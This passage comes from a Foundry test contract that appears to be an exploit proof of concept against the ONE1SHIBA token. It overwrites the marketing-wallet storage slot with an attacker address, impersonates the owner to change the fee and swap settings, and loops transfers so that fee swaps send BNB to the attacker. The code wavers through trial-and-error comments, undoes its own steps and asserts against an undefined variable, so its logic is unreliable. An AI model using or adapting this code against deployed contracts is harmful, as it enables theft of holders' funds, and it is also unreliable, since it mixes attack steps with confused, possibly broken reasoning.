        vm.store(TARGET, marketingSlot, bytes32(uint256(uint160(attacker))));

        // Step 4: Disable automatic fee processing
        ONE1SHIBA(TARGET).setSwapAndLiquifyEnabled(false);

        // Step 5: Exclude attacker from fees to avoid paying fees during accumulation
        ONE1SHIBA(TARGET).excludeFromFee(attacker);

        // Step 6: Get some tokens to create fee accumulation
        // First, get tokens from a holder (owner has all tokens initially)
        uint256 amountToTransfer = 1000000 * 10**9; // Small amount for testing
        ONE1SHIBA(TARGET).transfer(attacker, amountToTransfer);

        vm.stopPrank();

        // Step 7: Create fee accumulation by making transfers
        // Transfer tokens between accounts to generate fees
        address dummy = address(0x123);

        // First, approve attacker to spend tokens
        vm.prank(attacker);
        ONE1SHIBA(TARGET).approve(attacker, type(uint256).max);

        // Make several transfers to accumulate fees in contract
        for (uint i = 0; i < 5; i++) {
            vm.prank(attacker);
            ONE1SHIBA(TARGET).transfer(dummy, 10000 * 10**9);

            vm.prank(dummy);
            ONE1SHIBA(TARGET).transfer(attacker, 10000 * 10**9);
        }

        // Step 8: Check contract token balance
        uint256 contractBalance = ONE1SHIBA(TARGET).balanceOf(TARGET);
        require(contractBalance > 0, "No fees accumulated");

        // Step 9: Trigger swapAndLiquify manually
        // Need to meet the condition: contractBalance >= numTokensSellToAddToLiquidity
        // numTokensSellToAddToLiquidity = 250000 * 10**6 * 10**9
        // We need to accumulate enough fees or manipulate the threshold

        // Option: As owner, we can reduce the threshold
        vm.startPrank(owner);
        // We'll set maxTxAmount to current contract balance to trigger swap
        // This works because in _transfer(), if contractTokenBalance >= maxTxAmount,
        // it sets contractTokenBalance = maxTxAmount, then checks if >= numTokensSellToAddToLiquidity
        // So we need to set maxTxAmount to be >= numTokensSellToAddToLiquidity
        // Let's set it to a low value to trigger
        ONE1SHIBA(TARGET).setMaxTxPercent(1); // 1% of total supply = 10,000,000 * 10**6 * 10**9

        // Also need to ensure swapAndLiquifyEnabled is false for manual trigger
        ONE1SHIBA(TARGET).setSwapAndLiquifyEnabled(false);
        vm.stopPrank();

        // Step 10: Record initial BNB balance of attacker
        uint256 initialAttackerBNB = attacker.balance;

        // Step 11: Trigger the swap by transferring from contract to marketing address
        // We need to call transfer with contract as sender and marketing as recipient
        // But we can't directly call transfer from contract. Instead, we can use transferFrom
        // First, approve contract to spend its own tokens (weird but let's try)
        // Actually, we need to trigger _transfer() with from = TARGET
        // We can do this by having contract call transfer() to marketing
        // But contract can't call its own functions directly

        // Alternative: Use a flash loan or manipulate state to trigger the automatic swap
        // Let's make a transfer that will trigger swapAndLiquify
        // The condition in _transfer() requires:
        // 1. contractTokenBalance >= numTokensSellToAddToLiquidity
        // 2. !inSwapAndLiquify
        // 3. from != uniswapV2Pair
        // 4. swapAndLiquifyEnabled

        // We disabled swapAndLiquifyEnabled, so automatic won't trigger
        // We need to manually call swapAndLiquify
        // Only the contract itself can call swapAndLiquify (it's private)
        // But it's called from _transfer() when conditions are met

        // Let's re-enable swapAndLiquifyEnabled and trigger via transfer
        vm.prank(owner);
        ONE1SHIBA(TARGET).setSwapAndLiquifyEnabled(true);

        // Make a transfer that will trigger the swap
        // Need from != uniswapV2Pair, so transfer between two regular addresses
        // The contract must have enough tokens (>= numTokensSellToAddToLiquidity)
        // We might not have accumulated enough, so let's check and adjust

        if (contractBalance < 250000 * 10**6 * 10**9) {
            // Need to accumulate more fees or adjust numTokensSellToAddToLiquidity
            // As owner, we could adjust fees to accumulate faster
            vm.prank(owner);
            ONE1SHIBA(TARGET).setLiquidityFeePercent(50); // Increase fee to 50%

            // Make more transfers
            for (uint i = 0; i < 10; i++) {
                vm.prank(attacker);
                ONE1SHIBA(TARGET).transfer(dummy, 100000 * 10**9);

                vm.prank(dummy);
                ONE1SHIBA(TARGET).transfer(attacker, 100000 * 10**9);
            }
        }

        // Now trigger by making a transfer (from != uniswapV2Pair)
        vm.prank(attacker);
        ONE1SHIBA(TARGET).transfer(dummy, 1000 * 10**9);

        // Check if attacker received BNB
        uint256 finalAttackerBNB = attacker.balance;
        require(finalAttackerBNB > initialAttackerBNB, "No BNB received");

        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialAttackerBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

